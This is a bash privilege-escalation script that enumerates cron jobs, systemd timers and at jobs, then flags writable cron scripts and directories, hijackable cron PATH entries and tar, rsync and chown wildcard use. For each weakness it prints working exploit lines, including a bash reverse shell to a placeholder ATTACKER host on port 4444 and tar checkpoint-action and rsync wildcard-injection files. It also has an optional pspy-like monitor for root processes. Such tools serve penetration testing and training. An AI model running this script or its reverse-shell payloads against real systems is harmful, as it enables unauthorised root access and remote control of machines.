#!/bin/bash
# Cron Job Privilege Escalation
# Usage: ./cron_privesc.sh [--monitor]

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'

echo -e "${GREEN}=== Cron Job Exploitation ===${NC}\n"

# ── Enumerate All Cron Sources ──
echo -e "${GREEN}--- Cron Enumeration ---${NC}\n"

echo -e "${YELLOW}[*] Current user crontab:${NC}"
crontab -l 2>/dev/null || echo "  (none or not allowed)"

echo -e "\n${YELLOW}[*] /etc/crontab:${NC}"
cat /etc/crontab 2>/dev/null | grep -v '^#' | grep -v '^$'

echo -e "\n${YELLOW}[*] /etc/cron.d/:${NC}"
ls -la /etc/cron.d/ 2>/dev/null
for f in /etc/cron.d/*; do
    [ -f "$f" ] && echo -e "\n  --- $f ---" && cat "$f" 2>/dev/null | grep -v '^#' | grep -v '^$'
done

echo -e "\n${YELLOW}[*] /etc/cron.{hourly,daily,weekly,monthly}:${NC}"
for d in /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly; do
    [ -d "$d" ] && echo "  $d:" && ls -la "$d" 2>/dev/null
done

echo -e "\n${YELLOW}[*] /var/spool/cron/crontabs/:${NC}"
ls -la /var/spool/cron/crontabs/ 2>/dev/null || echo "  (not readable)"
for f in /var/spool/cron/crontabs/*; do
    [ -f "$f" ] && [ -r "$f" ] && echo -e "\n  --- $f ---" && cat "$f"
done

echo -e "\n${YELLOW}[*] Systemd timers:${NC}"
systemctl list-timers --all 2>/dev/null | head -20

echo -e "\n${YELLOW}[*] At jobs:${NC}"
atq 2>/dev/null || echo "  (none or not available)"

# ── Find Writable Cron Scripts ──
echo -e "\n${GREEN}--- Writable Cron Scripts ---${NC}\n"
CRON_FILES="/etc/crontab"
for f in /etc/cron.d/*; do [ -f "$f" ] && CRON_FILES="$CRON_FILES $f"; done
for f in /var/spool/cron/crontabs/*; do [ -f "$f" ] && [ -r "$f" ] && CRON_FILES="$CRON_FILES $f"; done

for cf in $CRON_FILES; do
    SCRIPTS=$(grep -oP '(/\S+)' "$cf" 2>/dev/null | grep -v '^/dev' | sort -u)
    for s in $SCRIPTS; do
        if [ -f "$s" ] && [ -w "$s" ]; then
            echo -e "${RED}[!] WRITABLE cron script: $s${NC}"
            echo -e "    Referenced in: $cf"
            echo -e "    Owner: $(ls -la "$s" | awk '{print $3":"$4}')"
            echo -e "    ${YELLOW}Exploit: echo 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1' >> $s${NC}\n"
        fi
        DIR=$(dirname "$s")
        if [ -d "$DIR" ] && [ -w "$DIR" ] && [ ! -f "$s" ]; then
            echo -e "${RED}[!] Missing script in writable dir: $s${NC}"
            echo -e "    Directory writable: $DIR"
            echo -e "    ${YELLOW}Exploit: Create $s with reverse shell${NC}\n"
        fi
    done
done

# ── Writable Cron Directories ──
echo -e "${GREEN}--- Writable Cron Directories ---${NC}\n"
for d in /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly; do
    if [ -d "$d" ] && [ -w "$d" ]; then
        echo -e "${RED}[!] WRITABLE cron directory: $d${NC}"
        echo -e "    ${YELLOW}Exploit: Drop a script with reverse shell in $d${NC}\n"
    fi
done

# ── PATH Hijacking in Cron ──
echo -e "${GREEN}--- Cron PATH Hijacking ---${NC}\n"
CRON_PATH=$(grep '^PATH' /etc/crontab 2>/dev/null | head -1 | cut -d= -f2)
if [ -n "$CRON_PATH" ]; then
    echo -e "${YELLOW}[*] Cron PATH: $CRON_PATH${NC}"
    IFS=':' read -ra CPATHS <<< "$CRON_PATH"
    for p in "${CPATHS[@]}"; do
        if [ -w "$p" ]; then
            echo -e "${RED}[!] Writable cron PATH directory: $p${NC}"
        fi
    done

    # Find cron commands that use relative paths
    for cf in $CRON_FILES; do
        CMDS=$(grep -vE '^#|^$|^[A-Z]' "$cf" 2>/dev/null | awk '{for(i=6;i<=NF;i++) printf "%s ",$i; print ""}' | grep -voP '^\s*/' 2>/dev/null)
        if [ -n "$CMDS" ]; then
            echo -e "${YELLOW}[*] Relative commands in $cf:${NC}"
            echo "$CMDS" | head -5
            echo -e "    ${YELLOW}These can be hijacked via writable PATH dirs${NC}\n"
        fi
    done
else
    echo -e "${YELLOW}[*] No PATH in /etc/crontab (uses system default)${NC}"
fi

# ── Wildcard Injection ──
echo -e "${GREEN}--- Wildcard Injection in Cron ---${NC}\n"
echo -e "${YELLOW}[*] Checking for tar/rsync/chown with wildcards in cron...${NC}"

for cf in $CRON_FILES; do
    # tar with wildcard
    if grep -qE 'tar\s.*\*' "$cf" 2>/dev/null; then
        echo -e "${RED}[!] tar with wildcard found in $cf${NC}"
        TARDIR=$(grep -oP 'tar\s+\S+\s+\S+\s+\K\S+' "$cf" 2>/dev/null | head -1)
        echo -e "    ${YELLOW}Exploit (in the target directory):${NC}"
        echo '    echo "" > "--checkpoint=1"'
        echo '    echo "" > "--checkpoint-action=exec=sh shell.sh"'
        echo '    echo "bash -i >& /dev/tcp/ATTACKER/4444 0>&1" > shell.sh'
        echo ""
    fi

    # rsync with wildcard
    if grep -qE 'rsync\s.*\*' "$cf" 2>/dev/null; then
        echo -e "${RED}[!] rsync with wildcard found in $cf${NC}"
        echo -e "    ${YELLOW}Exploit:${NC}"
        echo '    echo "bash -i >& /dev/tcp/ATTACKER/4444 0>&1" > shell.sh'
        echo '    echo "" > "-e sh shell.sh"'
        echo ""
    fi

    # chown with wildcard
    if grep -qE 'chown\s.*\*' "$cf" 2>/dev/null; then
        echo -e "${RED}[!] chown with wildcard found in $cf${NC}"
        echo -e "    ${YELLOW}Exploit:${NC}"
        echo '    echo "" > "--reference=/tmp/myfile"'
        echo ""
    fi
done

# ── Process Monitor (pspy-like) ──
if [ "$1" = "--monitor" ]; then
    echo -e "\n${GREEN}--- Process Monitor (pspy-like) ---${NC}"
    echo -e "${YELLOW}[*] Monitoring new processes for 120 seconds...${NC}"
    echo -e "${YELLOW}[*] Look for processes running as root that execute scripts${NC}\n"

    OLD_PROCS=$(ps -eo user,pid,command --no-headers)
    END=$((SECONDS + 120))

    while [ $SECONDS -lt $END ]; do
        NEW_PROCS=$(ps -eo user,pid,command --no-headers)
        diff <(echo "$OLD_PROCS") <(echo "$NEW_PROCS") | grep '^>' | while read -r line; do
            PROC_USER=$(echo "$line" | awk '{print $2}')
            PROC_CMD=$(echo "$line" | cut -d' ' -f4-)
            if [ "$PROC_USER" = "root" ]; then
                echo -e "${RED}[ROOT] $PROC_CMD${NC}"
            else
                echo -e "${YELLOW}[$PROC_USER] $PROC_CMD${NC}"
            fi
        done
        OLD_PROCS="$NEW_PROCS"
        sleep 0.5
    done
fi
